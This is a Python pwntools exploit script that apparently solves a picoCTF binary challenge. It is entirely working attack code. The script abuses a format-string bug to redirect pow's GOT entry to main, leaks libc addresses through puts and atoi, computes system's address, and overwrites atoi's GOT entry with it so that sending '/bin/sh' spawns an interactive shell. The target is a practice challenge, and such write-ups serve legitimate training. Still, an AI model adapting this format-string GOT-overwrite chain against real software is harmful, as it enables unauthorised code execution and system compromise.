from pwn import *

binary = ELF("chall")

libc = ELF("libc.so.6")

if not args.REMOTE:
    r = process(binary.path)
    #gdb.attach(r, api = True)
    
   
else:
    r = remote('mars.picoctf.net', 31929)
    # puts_offset_libc = 0x0875a0
    # system_offset = 0x055410


puts_offset_libc = libc.symbols["puts"] 
system_offset = libc.symbols['system'] 

pow_got = binary.got['pow']
main_addr = binary.symbols['main']

log.info(f"Main address: {hex(main_addr)}") # 0x400837
log.info(f"pow() GOT address: {hex(pow_got)}") # 0x601040

payload1 = b"11111111" + p64(pow_got) #+ p64(pow_got+4)

r.sendlineafter("A: ",payload1)

payload2 = b"1_______%" + str(int(main_addr) - 46).encode("ascii") + b"p%11$n--" #4196361

r.sendlineafter("B: ",payload2)

r.recvuntil("Calculating for A: ")
log.info("rewrote pow GOT to main")

######################################

def send_payload(r, a, b):
    log.info(f"Sending:\nA:\n{a}\nB:\n{hexdump(b)}")
    r.sendlineafter("A: ", a)
    r.sendlineafter("B: ", b)

def send_format(r, format, values):
    format_prefix = b'1_______'
    values_prefix = b'1_______'
    send_payload(r, format_prefix + format, values_prefix + values)
    out = r.recvline()
    arr = out.split(b" and ")
    res = arr[0].replace(b"Calculating for A: " + format_prefix, b"")
    log.info(f"Received:\n{hexdump(res)}")
    return res

log.info(f"puts() GOT address: {hex(binary.got['puts'])}")


output = send_format(r, b"%43$s.%44$s.", p64(binary.got["puts"]) + p64(binary.got["atoi"]))


puts_addr_str = output.split(b'.')[0].ljust(8, b'\x00')
atoi_addr_str = output.split(b".")[1].ljust(8, b'\x00')
puts_addr = int.from_bytes(puts_addr_str, "little") 
atoi_addr = int.from_bytes(atoi_addr_str, "little") 

log.info(f"puts() runtime address: {hex(puts_addr)}\n")

log.info(f"atoi() runtime address: {hex(atoi_addr)}\n")


libc_base_addr = u64(puts_addr_str) - puts_offset_libc
log.info(f"libc_base address: {hex(libc_base_addr)}\n")


system_addr = libc_base_addr + system_offset
log.info(f"system address: {hex(system_addr)}\n") 

##########################################################

atoi_got = binary.got['atoi']

log.info(f"atoi() GOT address: {hex(atoi_got)}") 

system_addr_high = (system_addr >> 32) & 0xFFFF
system_addr_medium = (system_addr >> 16) & 0xFFFF
system_addr_low = system_addr & 0xFFFF

print("Original values:")
print("High:", int(system_addr_high))
print("Medium:", int(system_addr_medium))
print("Low:", int(system_addr_low))

values = [
    ("high", system_addr_high, "13" ),
    ("medium", system_addr_medium, "12" ),
    ("low", system_addr_low, "11")
]

values.sort(key=lambda x: x[1])

print("\nSorted values:")

for item in values:
    print(item[0] + ":" , item[1] , item[2] )


payload1 = b"11111111" + p64(atoi_got ) + p64(atoi_got + 2 ) + p64(atoi_got + 4)

r.sendlineafter("A: ",payload1)

#payload2 = b"1_______%1p%12$n%2p%11$n"

# payload2 = b"1_______%" + str(int(system_addr_high) - 46).encode("ascii") + b"p%13$hn%" 
# payload2 += str(int(system_addr_low) - int(system_addr_high)).encode("ascii") + b"p%11$hn%"
# payload2 += str(int(system_addr_medium) - int(system_addr_low)).encode("ascii") + b"p%12$hn--" 
payload2 = b"1_______%" + str(values[0][1] - 46).encode("ascii") + b"p%" + values[0][2].encode("ascii") + b"$hn%" 
payload2 += str(values[1][1] - values[0][1]).encode("ascii") + b"p%"+ values[1][2].encode("ascii") + b"$hn%"
payload2 += str(values[2][1] - values[1][1]).encode("ascii") + b"p%"+ values[2][2].encode("ascii") + b"$hn--" 

r.sendlineafter("B: ",payload2)

##################################

r.recvuntil("Calculating for A: ")
log.info("rewrote atoi GOT to system")

payload1 = b"/bin/sh\x00"
r.sendlineafter("A: ",payload1)
payload2 = b"/sh"
r.sendlineafter("B: ",payload2)
                
r.interactive()


